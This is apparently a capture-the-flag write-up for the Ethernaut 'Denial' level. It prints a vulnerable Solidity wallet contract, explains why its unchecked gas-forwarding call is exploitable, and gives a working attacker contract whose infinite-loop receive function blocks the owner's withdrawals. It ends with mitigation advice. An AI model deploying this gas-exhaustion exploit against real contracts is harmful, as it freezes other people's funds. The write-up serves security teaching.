![](https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg)

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Solution:
## Analysis

Let's take a look at the vulnerable code:

```sol
function setWithdrawPartner(address _partner) public {
    partner = _partner;
}

function withdraw() public {
    uint amountToSend = address(this).balance.div(100);
    // perform a call without checking return
    // The recipient can revert, the owner will still get their share
    partner.call{value:amountToSend}("");
    owner.transfer(amountToSend);
    // keep track of last withdrawal time
    timeLastWithdrawn = now;
    withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
}
```

- The `setWithdrawPartner()` function is public and allows us to call it with our address so we can become a partner.

- The `withdraw()` function is calculating the amount to send inside `amountToSend` and makes two external calls. One of the calls is made to the `partner` address which is controlled by us and the other one is made to the `owner`'s address. These calls are transferring 1% Ether each to the owner and the partner. So the question is how can we prevent the owner from withdrawing?

An interesting fact about the `call()` function is that it forwards all the gas along with the call unless a gas value is specified in the call. The `transfer()` and `send()` only forwards 2300 gas.

The `call()` returns two values, a `bool success` showing if the call succeeded and a `bytes memory data` which contains the return value. It should be noted that the return values of the external calls are not checked anywhere.

To exploit the contract and prevent the `owner.transfer(amountToSend)` from being called, we need to create a contract with a `fallback` or `receive` function that drains all the gas and prevents further execution of the `withdraw()` function.

---
## The Exploit

Here's how our exploit code looks:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint);
}

contract PWN {
    IDenial instance;
    constructor(address _instance) {
      instance = IDenial(_instance);
    }

    function pwn() external {
        instance.setWithdrawPartner(address(this));
    }
    receive() external payable {
      while(true) {}
    }
}
```

___
This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

_Note_: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.